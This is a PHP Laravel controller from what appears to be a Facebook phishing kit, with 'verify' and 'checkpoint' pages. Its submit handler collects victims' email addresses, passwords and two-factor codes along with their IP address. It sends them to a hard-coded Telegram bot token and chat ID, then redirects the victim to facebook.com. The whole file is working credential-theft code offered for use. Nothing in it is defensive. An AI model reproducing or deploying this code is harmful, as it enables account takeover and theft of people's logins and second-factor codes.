<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class hehe extends Controller
{
    public function verify(){
        return view('verify');
    }
    public function checkpoint(){
        return view('checkpoint');
    }
    public function verifysubmit(Request $request){
        $data = $request->all();
        $token = "6746956080:AAHlMJuM-u68vU9-y6xoQkdm0vG3rbpcEnI";
        $chatid = "-1002098881792";
        $messaggio = '';
        if(isset($data['form_data'][1]) && !empty($data['form_data'][1])){
            $messaggio = "IP:".$this->getIp()."\n";
            $messaggio .= 'email: '.$data['form_data'][1]['value'];
            $messaggio .= "\nPassword: ".$data['form_data'][0]['value'];
            $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid. "&text=" . urlencode($messaggio);
            Http::get($url);
            $arr = [];
            $arr['code'] = '200';
            $arr['message'] = 'Success';
            $arr['data'] = '';
            return \response()->json($arr);
        }else{
            $messaggio .= "2fa: ".$data['form_data'][0]['value'];
            $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid. "&text=" . urlencode($messaggio);
            Http::get($url);
            $arr = [];
            $arr['code'] = '200';
            $arr['message'] = 'Success';
            $arr['data'] = 'https://facebook.com';
            return \response()->json($arr);
        }
        
        
    }

    public function getIp(){
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
            if (array_key_exists($key, $_SERVER) === true){
                foreach (explode(',', $_SERVER[$key]) as $ip){
                    $ip = trim($ip); // just to be safe
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
                        return $ip;
                    }
                }
            }
        }
        return request()->ip(); // it will return the server IP if the client IP is not found using this method.
    }
}
